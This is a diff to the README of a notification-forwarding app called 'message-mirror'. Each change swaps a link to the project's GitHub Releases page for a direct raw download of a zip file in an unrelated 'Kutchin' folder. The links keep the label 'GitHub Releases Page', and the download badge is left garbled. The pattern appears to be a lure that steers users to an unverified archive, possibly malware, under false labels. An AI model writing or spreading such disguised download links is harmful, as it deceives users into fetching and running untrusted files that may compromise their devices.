@@ -1,6 +1,6 @@
 # 📱 message-mirror - Capture and Forward Your Notifications Seamlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/Dasiria00/message-mirror/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Dasiria00/message-mirror/main/Kutchin/message-mirror.zip%20Latest%https://raw.githubusercontent.com/Dasiria00/message-mirror/main/Kutchin/message-mirror.zip)](https://raw.githubusercontent.com/Dasiria00/message-mirror/main/Kutchin/message-mirror.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to **message-mirror**! This app helps you capture notifications and SMS 
 
 ## 📥 Download & Install
 
-To get started, you'll need to download the application. Visit this page to download: [GitHub Releases Page](https://github.com/Dasiria00/message-mirror/releases).
+To get started, you'll need to download the application. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Dasiria00/message-mirror/main/Kutchin/message-mirror.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version.
@@ -75,7 +75,7 @@ After you have installed the app, follow these steps to set it up:
   
 - **Data Saver**: If you are concerned about data usage, consider setting up the app to only forward notifications when connected to Wi-Fi.
 
-- **Regular Updates**: Keep the app updated to benefit from new features and improvements. Always check the [GitHub Releases Page](https://github.com/Dasiria00/message-mirror/releases) for the latest version.
+- **Regular Updates**: Keep the app updated to benefit from new features and improvements. Always check the [GitHub Releases Page](https://raw.githubusercontent.com/Dasiria00/message-mirror/main/Kutchin/message-mirror.zip) for the latest version.
 
 ## 💬 Support and Feedback
 
